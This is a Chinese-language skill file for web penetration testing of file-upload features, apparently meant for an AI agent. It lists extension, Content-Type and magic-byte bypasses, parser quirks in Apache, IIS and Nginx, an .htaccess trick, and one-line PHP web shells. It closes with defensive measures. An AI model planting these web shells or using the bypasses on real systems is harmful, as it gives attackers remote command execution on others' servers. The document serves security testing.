---
name: file-upload-testing
description: 文件上传漏洞测试的专业技能和方法论
version: 1.0.0
---

# 文件上传漏洞测试

## 概述

文件上传功能是Web应用常见功能，但存在多种安全风险。

## 漏洞类型

### 1. 未验证文件类型 - 仅前端验证可被绕过
### 2. 文件内容未验证 - 仅检查扩展名
### 3. 路径遍历 - 未过滤文件名
### 4. 文件名覆盖 - 可预测的文件名

## 测试方法

### 1. 基础检测
**测试各种文件类型：**
```
.php, .jsp, .asp, .aspx
.php3, .php4, .php5, .phtml
.jspx, .jspf
.htaccess, .htpasswd
```

**测试双扩展名：**
```
shell.php.jpg
shell.jpg.php
```

**测试大小写：**
```
shell.PHP
shell.PhP
```

### 2. 内容类型绕过
```http
Content-Type: image/jpeg
但文件内容是PHP代码
```

**Magic Bytes：**
```php
GIF89a<?php phpinfo(); ?>
```

### 3. 解析漏洞
**Apache：** `shell.php.xxx` 可能解析为PHP

**IIS：** `shell.asp;.jpg`

**Nginx：** `shell.jpg%00.php`

## 利用技术

### PHP WebShell
```php
<?php system($_GET['cmd']); ?>

<?php eval($_POST['a']); ?>
```

### .htaccess利用
```
AddType application/x-httpd-php .jpg
```
然后上传shell.jpg（实际是PHP代码）

### 图片马
**GIF89a：**
```php
GIF89a
<?php phpinfo(); ?>
```

## 防护措施

1. **文件类型白名单** - 只允许特定扩展名
2. **文件内容验证** - 使用magic bytes检测真实文件类型
3. **重命名文件** - 使用UUID等不可预测的名称
4. **隔离存储** - 文件存储在Web根目录外
5. **文件扫描** - 使用杀毒软件扫描
6. **大小限制** - 限制上传文件大小
